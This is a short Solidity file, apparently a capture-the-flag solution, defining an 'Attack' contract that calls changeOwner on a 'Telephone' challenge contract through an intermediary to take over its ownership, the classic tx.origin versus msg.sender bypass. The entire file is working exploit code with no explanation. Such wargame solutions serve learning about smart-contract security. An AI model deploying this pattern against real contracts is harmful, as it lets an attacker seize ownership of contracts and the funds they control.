// SPDX-License-Identifier: MIT
pragma solidity ^0.8.15;
import './chall.sol';

contract Attack {

  address public owner;
  Telephone public telephone;

  constructor(address _telephone) public {
    owner = msg.sender;
    telephone = Telephone(_telephone);
  }
  
  function attack() public {
   telephone.changeOwner(msg.sender); 
  }

}